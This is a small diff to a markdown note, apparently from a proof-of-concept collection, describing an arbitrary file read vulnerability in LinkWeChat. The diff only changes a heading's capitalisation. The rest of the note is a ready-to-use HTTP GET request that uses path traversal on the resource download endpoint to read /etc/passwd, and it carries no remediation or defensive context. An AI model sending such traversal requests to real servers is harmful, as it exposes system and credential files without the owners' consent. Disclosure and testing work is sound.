@@ -1,6 +1,6 @@
 ## LinkWeChat任意文件读取漏洞
 
-## poc
+## POC
 ```
 GET /linkwechat-api/common/download/resource?name=/profile/../../../../../etc/passwd HTTP/1.1
 Host: ip:port
